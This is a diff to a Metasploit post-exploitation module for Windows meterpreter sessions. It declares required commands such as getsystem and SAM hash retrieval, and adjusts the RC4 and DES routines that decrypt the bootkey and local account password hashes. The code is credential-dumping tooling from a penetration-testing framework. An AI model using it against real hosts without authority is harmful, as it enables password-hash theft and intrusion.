@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Priv
@@ -24,7 +23,19 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_migrate
+              priv_elevate_getsystem
+              priv_passwd_get_sam_hashes
+              stdapi_registry_open_key
+              stdapi_sys_config_sysinfo
+              stdapi_sys_process_getpid
+            ]
+          }
+        }
       )
     )
     register_options(
@@ -41,7 +52,6 @@ class MetasploitModule < Msf::Post
     @sam_numeric = "0123456789012345678901234567890123456789\x00"
     @sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')
     @sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')
-
   end
 
   # Run Method for when run command is issued
@@ -71,6 +81,7 @@ class MetasploitModule < Msf::Post
     hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
     rc4 = OpenSSL::Cipher.new('rc4')
+    rc4.decrypt
     rc4.key = hash.digest
     hbootkey = rc4.update(vf[0x80, 32])
     hbootkey << rc4.final
@@ -163,7 +174,6 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def rid_to_key(rid)
-
     s1 = [rid].pack('V')
     s1 << s1[0, 3]
 
@@ -176,7 +186,6 @@ class MetasploitModule < Msf::Post
   #-------------------------------------------------------------------------------
 
   def decrypt_user_hash(rid, hbootkey, enchash, pass)
-
     if enchash.empty?
       case pass
       when @sam_lmpass
@@ -190,10 +199,12 @@ class MetasploitModule < Msf::Post
     des_k1, des_k2 = rid_to_key(rid)
 
     d1 = OpenSSL::Cipher.new('des-ecb')
+    d1.decrypt
     d1.padding = 0
     d1.key = des_k1
 
     d2 = OpenSSL::Cipher.new('des-ecb')
+    d2.decrypt
     d2.padding = 0
     d2.key = des_k2
 
@@ -201,13 +212,14 @@ class MetasploitModule < Msf::Post
     md5.update(hbootkey[0, 16] + [rid].pack('V') + pass)
 
     rc4 = OpenSSL::Cipher.new('rc4')
+    rc4.decrypt
     rc4.key = md5.digest
     okey = rc4.update(enchash)
 
-    d1o = d1.decrypt.update(okey[0, 8])
+    d1o = d1.update(okey[0, 8])
     d1o << d1.final
 
-    d2o = d2.decrypt.update(okey[8, 8])
+    d2o = d2.update(okey[8, 8])
     d1o << d2.final
     d1o + d2o
   end
